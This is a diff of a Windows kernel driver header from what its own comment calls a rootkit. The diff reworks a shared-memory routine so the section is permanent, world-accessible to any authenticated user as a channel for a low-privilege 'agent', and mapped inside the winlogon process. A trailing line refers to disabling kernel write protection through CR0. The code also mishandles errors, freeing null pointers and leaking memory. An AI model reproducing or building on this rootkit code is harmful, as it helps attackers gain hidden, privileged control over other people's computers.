@@ -1,47 +1,121 @@
 #pragma once
 
+#pragma comment(lib, "Ksecdd.lib")
+
 #include <ntifs.h>
 #include <wdf.h>
 #include <ntddk.h>
 #include "Globals.hpp"
 #include "Misc.hpp"
 #include "WinTypes.hpp"
+#include "ProcessUtils.hpp"
 #include <intrin.h>
 
 /**
  * TODO
  */
 NTSTATUS 
-BeCreateSharedMemory(HANDLE hSharedMemory, PVOID pSharedMemory)
+BeCreateSharedMemory(PHANDLE phSharedMemory, PVOID* ppSharedMemory)
 {
+	// TODO: dynamicly resolve all functions
+	
+	ULONG daclSize;
+	PACL Dacl = NULL;
+	PSECURITY_DESCRIPTOR sd = NULL;
+
 	UNICODE_STRING sectionName;
-	OBJECT_ATTRIBUTES objAttributes;
-	LARGE_INTEGER sectionSize;
-	SIZE_T bufSize = 1024; // TODO
+	RtlInitUnicodeString(&sectionName, L"\\BaseNamedObjects\\Global\\BeShared");
 
-	RtlInitUnicodeString(&sectionName, L"\\Global\\MySharedMemory"); // TODO
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
 
-	InitializeObjectAttributes(&objAttributes, &sectionName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
+	//
 
-	sectionSize.QuadPart = bufSize;
+	// Add permissions to all users to our shared memory, so that a lowpriv agent can still access the rootkit
 
-	NTSTATUS status = ZwCreateSection(&hSharedMemory, SECTION_ALL_ACCESS, &objAttributes, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
-
-	if (!NT_SUCCESS(status)) 
+	// Create the DACL
+	daclSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) - sizeof(ULONG) + RtlLengthSid(SeExports->SeAuthenticatedUsersSid);
+	Dacl = (PACL)ExAllocatePoolWithTag(NonPagedPool, daclSize, DRIVER_TAG); // TODO: FREE
+	if (Dacl == NULL)
 	{
-		LOG_MSG("Failed to create shared memory: 0x%X\n", status);
+		ExFreePool(Dacl);
+		return STATUS_UNSUCCESSFUL;
+	}
+	
+	status = RtlCreateAcl(Dacl, daclSize, ACL_REVISION);
+	if (status != STATUS_SUCCESS)
+	{
+		ExFreePool(Dacl);
 		return status;
 	}
 
-	// Map the shared memory into kernel address space
-	status = ZwMapViewOfSection(hSharedMemory, ZwCurrentProcess(), &pSharedMemory, 0, sectionSize.QuadPart, NULL, &bufSize, ViewUnmap, 0, PAGE_READWRITE);
+	status = RtlAddAccessAllowedAce(Dacl, ACL_REVISION, SECTION_ALL_ACCESS, SeExports->SeAuthenticatedUsersSid);
+	if (status != STATUS_SUCCESS)
+	{
+		ExFreePool(Dacl);
+		return status;
+	}
 
-	if (!NT_SUCCESS(status)) 
+	// Create the security descriptor
+	sd = (PSECURITY_DESCRIPTOR)ExAllocatePoolWithTag(NonPagedPool, SECURITY_DESCRIPTOR_MIN_LENGTH, DRIVER_TAG); // TODO: FREE
+	if (sd == NULL)
+	{
+		ExFreePool(sd);
+		ExFreePool(Dacl);
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	status = RtlCreateSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION);
+	if (status != STATUS_SUCCESS)
+	{
+		ExFreePool(sd);
+		ExFreePool(Dacl);
+		return status;
+	}
+
+	status = RtlSetDaclSecurityDescriptor(sd, TRUE, Dacl, FALSE);
+	if (!NT_SUCCESS(status))
+	{
+		LOG_MSG("Failed to set DACL in security descriptor\n");
+		ExFreePool(sd);
+		ExFreePool(Dacl);
+		return status;
+	}
+
+	//
+
+	OBJECT_ATTRIBUTES objAttributes;
+	InitializeObjectAttributes(&objAttributes, &sectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, sd);
+	
+	LARGE_INTEGER sectionSize = { 0 };
+	sectionSize.LowPart = 1024 * 10; // TODO
+
+	status = ZwCreateSection(phSharedMemory, SECTION_ALL_ACCESS, &objAttributes, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
+	if (status != STATUS_SUCCESS)
+	{
+		LOG_MSG("ZwCreateSection fail! Status: 0x%X\n", status);
+		ExFreePool(sd);
+		ExFreePool(Dacl);
+		return status;
+	}
+
+	//
+
+	SIZE_T ulViewSize = 1024 * 10;
+
+	// TODO: document
+	KAPC_STATE apc;
+	KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
+
+	status = ZwMapViewOfSection(BeGlobals::hSharedMemory, ZwCurrentProcess(), &BeGlobals::pSharedMemory, 0, ulViewSize, NULL, &ulViewSize, ViewUnmap, 0, PAGE_READWRITE);
+	if (status != STATUS_SUCCESS)
 	{
 		LOG_MSG("Failed to map shared memory: 0x%X\n", status);
-		ZwClose(hSharedMemory);
-		return status;
+		ZwClose(BeGlobals::hSharedMemory);
+		return STATUS_UNSUCCESSFUL;
 	}
+	LOG_MSG("Mapped shared memory of size at 0x%llx\n", BeGlobals::pSharedMemory);
+
+	KeUnstackDetachProcess(&apc);
 
 	return STATUS_SUCCESS;
 }
@@ -52,6 +126,10 @@ BeCreateSharedMemory(HANDLE hSharedMemory, PVOID pSharedMemory)
 VOID 
 BeCloseSharedMemory(HANDLE hSharedMemory, PVOID pSharedMemory)
 {
+	// TODO: document
+	KAPC_STATE apc;
+	KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
+
 	if (BeGlobals::pSharedMemory != NULL) 
 	{
 		ZwUnmapViewOfSection(ZwCurrentProcess(), pSharedMemory);
@@ -63,6 +141,8 @@ BeCloseSharedMemory(HANDLE hSharedMemory, PVOID pSharedMemory)
 		ZwClose(hSharedMemory);
 		hSharedMemory = NULL;
 	}
+
+	KeUnstackDetachProcess(&apc);
 }
 
 // Disable write protection by setting cr0
